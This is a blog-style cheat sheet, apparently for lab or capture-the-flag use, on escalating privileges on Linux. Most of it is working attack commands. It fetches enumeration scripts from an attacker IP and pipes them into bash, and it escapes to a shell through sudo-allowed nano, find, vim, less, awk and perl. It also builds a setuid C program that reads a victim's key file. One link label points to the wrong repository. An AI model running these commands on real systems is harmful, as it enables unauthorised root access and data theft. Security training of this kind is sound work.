---
author: Marcos Azevedo
date: '2020-06-16T17:38:15-03:00'
linktitle: 'Cheat Sheet :: Privilege Escalation'
title: 'Cheat Sheet :: Privilege Escalation'
categories:
  - cheatsheet
  - exploitation-techniques
  - priv-escalation
tags:
  - cheatsheet
  - priv-escalation
  - exploitation-techniques
weight: 10
date updated: '2021-03-25T17:36:52-03:00'

---


# Cheat Sheet :: Privilege Escalation

## Using scripts to enum the machine
- [https://github.com/rebootuser/LinEnum](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

- [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

- On the target's machine we can do:
```bash
$ curl 10.10.14.2/linpeas.sh | bash
$ curl 10.10.14.2/LinEnum.sh | bash
```

-----
## Nano privilege escalation
- This can be used to gain root access on the server.
```bash
sudo -u root /bin/nano /opt/priv
```

- Nano allows inserting external files into the current one using the shortcut.
```bash
Ctrl+R
```

/pics/nano-001.png

- The command reveals that we can execute system commands using **^X (Press Ctrl + X)** and enter the following command to spawn a shell.
```bash
Press Ctrl + X
reset; sh 1>&0 2>&0
```

/pics/nano-002.png

- Now we have a root shell.
/pics/nano-003.png

-----
## Sudo privilege escalation
### Listing allowed ``sudo`` commands
```bash
$ sudo -l
```

### Impersonating with ``sudo``
```bash
$ sudo -u victim command
```

### Escalating privileges with ``find`` command
```bash
$ sudo -u victim /usr/bin/find -exec /bin/bash \;
```

### Escalating privileges with ``vim`` editor
```bash
$ sudo -u victim /usr/bin/vim

# Inside the vim we can call a shell
:!/bin/bash
```

### Escalating privileges with  ``less`` command
- Open a file using less
```
$ sudo -u victim less /home/victim/key.txt
```

- Inside the less we can call a shell
```bash
!/bin/bash
```

### Escalating privileges with ``awk`` command
```bash
# Reading files with awk
$ sudo -u victim /usr/bin/awk '{print $1}' /home/victim/key.txt

# Executing command within awk
$ sudo -u victim /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

### Escalating privileges with ``chmod``

- Create the exploit to call a command
```bash
#include<stdio.h>

int main(void)
{
    system("cat /home/victim/key.txt");
}
```

- Compiling the exploit
```bash
$ cd /tmp
$ gcc exploit.c -o exploit
```

- Setting the __setuid__ and __setgid__ flags
```bash
$ sudo -u victim cp exploit exploit2
$ sudo -u victim chmod +xs exploit2
$ ./exploit2
```

### Escalating privileges with ``perl``
```bash
$ sudo -u victim perl -e 'exec "/bin/bash";'
```
